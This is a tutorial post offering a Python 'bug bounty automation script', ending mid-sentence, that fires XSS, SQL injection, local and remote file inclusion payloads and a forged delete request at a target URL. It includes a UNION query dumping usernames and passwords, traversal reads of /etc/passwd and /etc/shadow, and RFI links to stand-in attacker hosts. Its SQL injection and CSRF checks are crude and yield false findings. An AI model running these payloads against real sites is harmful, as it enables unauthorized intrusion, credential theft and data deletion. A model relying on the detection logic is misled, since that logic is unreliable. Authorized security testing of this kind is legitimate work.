This script focuses on the following:

    XSS: Tests for stored and reflected XSS.

    SQL Injection: Tests for SQL injection vulnerabilities by injecting payloads.

    CSRF: Checks if there is a CSRF vulnerability.

    LFI/RFI: Tests for Local File Inclusion and Remote File Inclusion.

Bug Bounty Automation Script

import requests
import time
import json

# Payloads for XSS
XSS_PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src='x' onerror='alert(1);'>",
    "<svg/onload=alert(1)>"
]

# Payloads for SQL Injection
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, username, password FROM users --",
    "' AND 1=1 --"
]

# Payloads for Local File Inclusion (LFI)
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../../etc/shadow"
]

# Payloads for Remote File Inclusion (RFI)
RFI_PAYLOADS = [
    "http://malicious.com/malicious_file.php",
    "http://evilsite.com/malicious_payload.txt"
]

# Function to test XSS vulnerability
def test_xss(url):
    for payload in XSS_PAYLOADS:
        response = requests.get(url, params={'search': payload})
        if payload in response.text:
            return True, payload
    return False, None

# Function to test SQL Injection vulnerability
def test_sql_injection(url):
    for payload in SQL_PAYLOADS:
        response = requests.get(url, params={'id': payload})
        if "SQL" in response.text or "error" in response.text:
            return True, payload
    return False, None

# Function to test for CSRF vulnerability
def test_csrf(url):
    # This is a simple check for CSRF vulnerability
    payload = {"action": "delete", "item_id": "1"}
    response = requests.post(url, data=payload)
    
    if "delete" in response.text.lower():
        return True, payload
    return False, None

# Function to test Local File Inclusion (LFI) vulnerability
def test_lfi(url):
    for payload in LFI_PAYLOADS:
        response = requests.get(url, params={'file': payload})
        if "root" in response.text or "passwd" in response.text:
            return True, payload
    return False, None

# Function to test Remote File Inclusion (RFI) vulnerability
def test_rfi(url):
    for payload in RFI_PAYLOADS:
        response = requests.get(url, params={'file': payload})
        if "malicious" in response.text:
            return True, payload
    return False, None

# Function to generate a report
def generate_report(vulnerability_type, url, payload, success, additional_info=None):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    report = {
        'timestamp': timestamp,
        'vulnerability': vulnerability_type,
        'url': url,
        'payload': payload,
        'success': success,
        'additional_info': additional_info
    }
    return report

# Function to log the report to a file
def log_report(report):
    with open("bug_bounty_reports.json", "a") as file:
        json.dump(report, file)
        file.write("\n")

# Main function to execute the testing and logging
def main():
    target_url = "http://example.com/vulnerable-page"
    
    # Test for XSS vulnerability
    xss_success, xss_payload = test_xss(target_url)
    xss_report = generate_report("XSS", target_url, xss_payload, xss_success)
    log_report(xss_report)

    # Test for SQL Injection vulnerability
    sql_injection_success, sql_payload = test_sql_injection(target_url)
    sql_injection_report = generate_report("SQL Injection", target_url, sql_payload, sql_injection_success)
    log_report(sql_injection_report)

    # Test for CSRF vulnerability
    csrf_success, csrf_payload = test_csrf(target_url)
    csrf_report = generate_report("CSRF", target_url, csrf_payload, csrf_success)
    log_report(csrf_report)

    # Test for Local File Inclusion (LFI) vulnerability
    lfi_success, lfi_payload = test_lfi(target_url)
    lfi_report = generate_report("LFI", target_url, lfi_payload, lfi_success)
    log_report(lfi_report)

    # Test for Remote File Inclusion (RFI) vulnerability
    rfi_success, rfi_payload = test_rfi(target_url)
    rfi_report = generate_report("RFI", target_url, rfi_payload, rfi_success)
    log_report(rfi_report)

    print("Testing complete. Reports have been generated.")

if __name__ == "__main__":
    main()

How the Script Works:

    XSS (Cross-Site Scripting):

        The script injects multiple payloads to detect if the web application is vulnerable to XSS. If the payload appears in the response, it is considered a vulnerability.

    SQL Injection:

        The script tests for SQL injection vulnerabilities by sending common SQL injection payloads in URL parameters and checking for SQL-related error messages or abnormal behavior.

    CSRF (Cross-Site Request Forgery):

        The script sends a POST request with a common CSRF payload (such as a request to delete an item) and checks if it is processed by the server. If it is, the system may be vulnerable to CSRF.

    LFI (Local File Inclusion):

        The script sends multiple payloads designed to test for LFI vulnerabilities by attempting to include sensitive system files (like /etc/passwd). If the response contains the content of these files, the server is vulnerable.

    RFI (Remote File Inclusion):

        The script checks if the application allows remote files to be included by injecting URLs pointing to potentially malicious files. If the file is loaded, it indicates a potential RFI vulnerability.

    Report Generation:

        Each test is logged with relevant details, including the timestamp, vulnerability type, payload used, success flag, and any additional information (such as missing headers or error messages).

Example of Generated Report:

{
    "timestamp": "2025-04-22 14:30:12",
    "vulnerability": "XSS",
    "url": "http://example.com/vulnerable-page",
    "payload": "<script>alert('XSS');</script>",
    "success": true,
    "additional_info": null
}

How to Use:

    Modify the target_url variable to point to the web application you are testing.

    The script will automatically test for various vulnerabilities (XSS, SQL Injection, CSRF, LFI, RFI).

    Once completed, the results are saved in a file called bug_bounty_reports.json.

    Analyze the generated report to identify vulnerabilities in the web application.

Next Steps:

    Add More Tests: You can extend the script with more tests such as Command Injection, Directory Traversal, or checks for open ports and other common vulnerabilities.

    Integrate with Burp Suite or OWASP ZAP: Use their APIs to automate advanced testing, scan for more complex vulnerabilities, and integrate with your bug bounty process.

    Rate Limiting: For aggressive testing, consider adding rate-limiting logic to avoid hitting the target too 
